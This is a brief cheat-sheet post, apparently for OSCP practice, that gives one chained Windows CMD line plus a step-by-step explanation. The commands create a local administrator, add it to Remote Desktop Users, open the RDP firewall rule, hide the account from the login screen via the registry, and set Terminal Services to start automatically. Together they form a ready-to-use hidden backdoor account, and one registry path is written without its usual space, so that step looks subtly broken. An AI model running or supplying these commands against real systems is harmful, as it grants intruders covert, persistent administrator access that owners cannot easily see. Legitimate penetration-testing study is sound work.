# Enable RDP in one line CMD

This is very helpful during OSCP.

Change Username and Password.

## CMD

net user /add (Username) (Password) && net localgroup administrators (Username) /add & net localgroup "Remote Desktop Users" (Username) /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v (Username) /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto

### Explain

####Adding User: 
net user /add (Username) (Password)

#### Adding User in Administrator Group:
net localgroup administrators (Username) /add

#### Adding user in Remote Desktop Users:
net localgroup "Remote Desktop Users" (Username) /add

#### Opening Port in Local Firewall:
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

#### Hiding User from Window Login Screen:
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v (Username) /t REG_DWORD /d 0 

#### Setting Terminal Service in Startup Mode:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f

#### Setting Terminal Service in Auto Mode:
sc config TermService start= auto 
